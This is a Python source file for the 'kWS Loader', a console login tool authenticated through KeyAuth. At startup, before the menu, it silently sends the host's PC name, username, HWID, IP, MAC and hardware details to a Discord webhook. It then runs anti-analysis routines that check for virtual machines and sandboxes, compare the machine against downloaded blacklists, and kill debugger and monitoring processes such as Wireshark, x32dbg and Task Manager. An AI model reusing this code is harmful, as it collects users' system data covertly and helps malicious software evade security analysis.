###############################################MODULES###############################################
import requests
import subprocess
import json
import os
import time
import json as jsond
import win32gui
import win32con
import binascii
import requests
from uuid import uuid4
import win32gui
import win32con
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
import platform
import datetime
from datetime import datetime
import sys
import os.path
import colorama
from colorama import Fore
import re
import ctypes
import uuid
import platform
import wmi
import psutil
from datetime import datetime
from urllib.request import Request, urlopen
import dhooks
from dhooks import Webhook
import threading
import webbrowser
import pystyle
from pystyle import Colors, Colorate, Center
from tools.app import app
###############################################MODULES###############################################


def clear(): return os.system('cls' if os.name in ('nt', 'dos') else 'clear')


clear()

###############################################SETTINGS###############################################
vmcheck_switch = True  # Enabled by default / Check if this file is running on a vm
vtdetect_switch = True  # Enabled by default / Info sending through Discord webhook
# Disabled by default / will block all blacklisted virustotal machines
listcheck_switch = False
anti_debug_switch = False  # Disabled by default / block debugger programs
# If everything is on the program will be "fully protected"!
api = ""  # DISCORD WEBHOOK
# Disabled by default / checks if the user is banned and auto closes app.
live_ban_checking = False
programblacklist = ["httpdebuggerui.exe", "wireshark.exe", "HTTPDebuggerSvc.exe", "fiddler.exe", "regedit.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe",
                    "pestudio.exe", "vmwareuser", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]
###############################################SETTINGS###############################################

logo = """
██╗  ██╗██╗    ██╗███████╗    ██╗      ██████╗  █████╗ ██████╗ ███████╗██████╗ 
██║ ██╔╝██║    ██║██╔════╝    ██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
█████╔╝ ██║ █╗ ██║███████╗    ██║     ██║   ██║███████║██║  ██║█████╗  ██████╔╝
██╔═██╗ ██║███╗██║╚════██║    ██║     ██║   ██║██╔══██║██║  ██║██╔══╝  ██╔══██╗
██║  ██╗╚███╔███╔╝███████║    ███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║  ██║
╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                               """


def printLogo():
    print(Center.XCenter(Colorate.Vertical(Colors.white_to_blue, logo, 1)))


def block_debuggers():
    while True:
        time.sleep(1)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in programblacklist):
                try:
                    print("\nBlacklisted program found! Name: "+str(proc.name()))
                    proc.kill()
                    time.sleep(2)
                    os._exit(1)
                except(psutil.NoSuchProcess, psutil.AccessDenied):
                    pass


def block_dlls():
    while True:
        time.sleep(1)
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            requests.post(f'{api}', json={
                          'content': f"**Sandboxie DLL Detected**"})
            os._exit(1)
        except:
            pass


def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip


ip = getip()

serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
os_name = str(os_name).replace("'", "")
os_name = str(os_name).replace("b", "")
gpu = computer.Win32_VideoController()[0].Name
hwid = subprocess.check_output(
    'wmic csproduct get uuid').decode().split('\n')[1].strip()
hwidlist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')


def vtdetect():
    webhooksend = Webhook(api)
    webhooksend.send(f"""```yaml
![PC DETECTED]!  
PC Name: {pc_name}
PC Username: {serveruser}
HWID: {hwid}
IP: {ip}
MAC: {mac}
PLATFORM: {os_name}
CPU: {computer.Win32_Processor()[0].Name}
RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
GPU: {gpu}
TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```""")


def vmcheck():
    def get_base_prefix_compat():  # define all of the checks
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    def in_virtualenv():
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv() == True:  # if we are in a vm
        requests.post(f'{api}', json={
                      'content': f"**VM DETECTED EXITING PROGRAM...**"})
        os._exit(1)  # exit

    else:
        pass

    def registry_check():  # VM REGISTRY CHECK SYSTEM [BETA]
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")

        if reg1 != 1 and reg2 != 1:
            print("VMware Registry Detected")
            requests.post(f'{api}', json={
                          'content': f"**VMware Registry Detected**"})
            os._exit(1)

    def processes_and_files_check():
        vmware_dll = os.path.join(
            os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(
            os.environ["SystemRoot"], "vboxmrxnp.dll")

        process = os.popen(
            'TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace(
                    "K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            print("VMwareService.exe & VMwareTray.exe process are running")
            requests.post(f'{api}', json={
                          'content': f"**VMwareService.exe & VMwareTray.exe process are running**"})
            os._exit(1)

        if os.path.exists(vmware_dll):
            print("Vmware DLL Detected")
            requests.post(f'{api}', json={
                          'content': f"**Vmware DLL Detected**"})
            os._exit(1)

        if os.path.exists(virtualbox_dll):
            print("VirtualBox DLL Detected")
            requests.post(f'{api}', json={
                          'content': f"**VirtualBox DLL Detected**"})
            os._exit(1)

        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            requests.post(f'{api}', json={
                          'content': f"**Sandboxie DLL Detected**"})
            os._exit(1)
        except:
            pass

    def mac_check():
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list:
            print("VMware MAC Address Detected")
            requests.post(f'{api}', json={
                          'content': f"**VMware MAC Address Detected**"})
            os._exit(1)
    print("[*] Checking VM")
    registry_check()
    processes_and_files_check()
    mac_check()
    print("[+] VM Not Detected : )")
    webhooksend = Webhook(api)
    webhooksend.send("[+] VM Not Detected : )")


def listcheck():
    try:
        if hwid in hwidlist.text:
            print('BLACKLISTED HWID DETECTED')
            print(f'HWID: {hwid}')
            requests.post(f'{api}', json={
                          'content': f"**Blacklisted HWID Detected. HWID:** `{hwid}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if serveruser in pcusernamelist.text:
            print('BLACKLISTED PC USER DETECTED!')
            print(f'PC USER: {serveruser}')
            requests.post(f'{api}', json={
                          'content': f"**Blacklisted PC User:** `{serveruser}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if pc_name in pcnamelist.text:
            print('BLACKLISTED PC NAME DETECTED!')
            print(f'PC NAME: {pc_name}')
            requests.post(f'{api}', json={
                          'content': f"**Blacklisted PC Name:** `{pc_name}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if ip in iplist.text:
            print('BLACKLISTED IP DETECTED!')
            print(f'IP: {ip}')
            requests.post(f'{api}', json={
                          'content': f"**Blacklisted IP:** `{ip}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if mac in maclist.text:
            print('BLACKLISTED MAC DETECTED!')
            print(f'MAC: {mac}')
            requests.post(f'{api}', json={
                          'content': f"**Blacklisted MAC:** `{mac}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if gpu in gpulist.text:
            print('BLACKLISTED GPU DETECTED!')
            print(f'GPU: {gpu}')
            requests.post(f'{api}', json={
                          'content': f"**Blacklisted GPU:** `{gpu}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)


if anti_debug_switch == True:
    try:
        b = threading.Thread(name='Anti-Debug', target=block_debuggers)
        b.start()
        b2 = threading.Thread(name='Anti-DLL', target=block_dlls)
        b2.start()
    except:
        pass
else:
    pass

if vtdetect_switch == True:
    vtdetect()
else:
    pass
if vmcheck_switch == True:
    vmcheck()
else:
    pass
if listcheck_switch == True:
    listcheck()
else:
    pass


def upgrade(username: str, key: str) -> bool:
    hwid = subprocess.check_output(
        'wmic csproduct get uuid').decode().split('\n')[1].strip()
    init_url = "https://keyauth.win/api/1.1/?type=init&ver=1.0&name=APPNAMEHERE&ownerid=OWNERIDHERE"
    try:
        with requests.post(init_url) as response:
            if response.status_code == 200:
                if response.json()["success"]:
                    sessionId = response.json()["sessionid"]
                    api_url = f"https://keyauth.win/api/1.1/?type=upgrade&username={username}&key={key}&sessionid={sessionId}&name=APPNAMEHERE&ownerid=OWNERIDHERE"
                    try:
                        with requests.post(api_url) as response2:
                            if response2.status_code == 200:
                                if response2.json()["success"]:
                                    #print(" Registered!")
                                    return True
                                else:
                                    message = response2.json()["message"]
                                    print(f" Error: {message}")
                                    return False
                            else:
                                print(Center.XCenter(Colorate.Horizontal(
                                    Colors.white_to_red, "Failed!", 1)))
                                return False
                    except Exception as e:
                        print(F" Error: {e}")
                        return False
                else:
                    message = response.json()["message"]
                    print(f" Error: {message}")
                    return False
            else:
                print(Center.XCenter(Colorate.Horizontal(
                    Colors.white_to_red, "Failed!", 1)))
                return False
    except Exception as e:
        print(F" Error: {e}")
        return False


def register(username: str, password: str, key: str) -> bool:
    hwid = subprocess.check_output(
        'wmic csproduct get uuid').decode().split('\n')[1].strip()
    init_url = "https://keyauth.win/api/1.1/?type=init&ver=1.0&name=APPNAMEHERE&ownerid=OWNERIDHERE"
    try:
        with requests.post(init_url) as response:
            if response.status_code == 200:
                if response.json()["success"]:
                    sessionId = response.json()["sessionid"]
                    api_url = f"https://keyauth.win/api/1.1/?type=register&username={username}&pass={password}&key={key}&hwid={hwid}&sessionid={sessionId}&name=APPNAMEHERE&ownerid=OWNERIDHERE"
                    try:
                        with requests.post(api_url) as response2:
                            if response2.status_code == 200:
                                if response2.json()["success"]:
                                    #print(" Registered!")
                                    return True
                                else:
                                    message = response2.json()["message"]
                                    print(f" Error: {message}")
                                    return False
                            else:
                                print(Center.XCenter(Colorate.Horizontal(
                                    Colors.white_to_red, "Failed!", 1)))
                                return False
                    except Exception as e:
                        print(F" Error: {e}")
                        return False
                else:
                    message = response.json()["message"]
                    print(f" Error: {message}")
                    return False
            else:
                print(Center.XCenter(Colorate.Horizontal(
                    Colors.white_to_red, "Failed!", 1)))
                return False
    except Exception as e:
        print(F" Error: {e}")
        return False


def login(username: str, password: str) -> bool:
    hwid = subprocess.check_output(
        'wmic csproduct get uuid').decode().split('\n')[1].strip()
    init_url = "https://keyauth.win/api/1.1/?type=init&ver=1.0&name=APPNAMEHERE&ownerid=OWNERIDHERE"
    try:
        with requests.post(init_url) as response:
            if response.status_code == 200:
                if response.json()["success"]:
                    sessionId = response.json()["sessionid"]
                    api_url = f"https://keyauth.win/api/1.1/?type=login&username={username}&pass={password}&hwid={hwid}&sessionid={sessionId}&name=APPNAMEHERE&ownerid=OWNERIDHERE"
                    try:
                        with requests.post(api_url) as response2:
                            if response2.status_code == 200:
                                if response2.json()["success"]:
                                    #print(" Logged in!")
                                    return True
                                else:
                                    message = response2.json()["message"]
                                    print(f" Error: {message}")
                                    return False
                            else:
                                print(Center.XCenter(Colorate.Horizontal(
                                    Colors.white_to_red, "Failed!", 1)))
                                return False
                    except Exception as e:
                        print(F" Error: {e}")
                        return False
                else:
                    message = response.json()["message"]
                    print(f" Error: {message}")
                    return False
            else:
                print(Center.XCenter(Colorate.Horizontal(
                    Colors.white_to_red, "Failed!", 1)))
                return False
    except Exception as e:
        print(F" Error: {e}")
        return False


def main() -> None:
    choice = ""
    clear()
    os.system("title kWS Loader - Main Menu")
    print()
    printLogo()
    print()
    print(Center.XCenter(Colorate.Horizontal(Colors.red_to_white, " Welcome!", 1)))
    print()
    print(Center.XCenter(Colorate.Horizontal(
        Colors.white_to_blue, " [1] Login", 1)))
    print(Center.XCenter(Colorate.Horizontal(
        Colors.white_to_blue, " [2] Register", 1)))
    print(Center.XCenter(Colorate.Horizontal(
        Colors.white_to_blue, " [3] Upgrade", 1)))
    print(Center.XCenter(Colorate.Horizontal(
        Colors.white_to_blue, " [4] Exit", 1)))
    print(Center.XCenter(Colorate.Horizontal(
        Colors.white_to_green, "\n Choose a number", 1)))
    choice = input("\n > ")

    if choice == "1":
        clear()
        os.system("title kWS Loader - Login Menu")
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Username:", 1)))
        username = input()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Password:", 1)))
        password = input()
        response = login(username, password)
        if response:
            clear()
            app()
        else:
            time.sleep(3)
            clear()
            os.system("title kWS Loader - Auth Error")
            print()
            print(Center.XCenter(Colorate.Horizontal(
                Colors.white_to_red, " Auth Error! Check your credentials!", 1)))
            time.sleep(3)
            main()

    if choice == "2":
        clear()
        os.system("title kWS Loader - Register Menu")
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Username: ", 1)))
        username = input()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Password: ", 1)))
        password = input()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Key: ", 1)))
        key = input()
        response = register(username, password, key)
        if response:
            clear()
            app()
        else:
            time.sleep(3)
            clear()
            os.system("title kWS Loader - Auth Error")
            print()
            print(Center.XCenter(Colorate.Horizontal(
                Colors.white_to_red, " Wrong Key!", 1)))
            time.sleep(3)
            main()

    if choice == "3":
        clear()
        os.system("title kWS Loader - Upgrade Menu")
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Username: ", 1)))
        username = input()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Key: ", 1)))
        key = input()
        response = upgrade(username, key)
        if response:
            clear()
            app()
        else:
            time.sleep(3)
            clear()
            os.system("title kWS Loader - Auth Error")
            print()
            print(Center.XCenter(Colorate.Horizontal(
                Colors.white_to_red, " Wrong Key or Username!", 1)))
            time.sleep(3)
            main()

    if choice == "4":
        clear()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_red, " Goodbye...", 1)))
        time.sleep(2)
        exit()

    if choice == "5":
        clear()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Opening website...", 1)))
        webbrowser.open('https://kwayservices.top/', new=2)
        time.sleep(2)
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Back to main menu...", 1)))
        main()

    if choice == "6":
        clear()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Opening website...", 1)))
        webbrowser.open('https://discord.gg/kway/', new=2)
        time.sleep(2)
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Back to main menu...", 1)))
        main()

    if choice != "1" and choice != "2" and choice != "3" and choice != "4" and choice != "5" and choice != "6":
        clear()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_red, " Invalid Choice!", 1)))
        time.sleep(2)
        main()


if __name__ == "__main__":
    main()
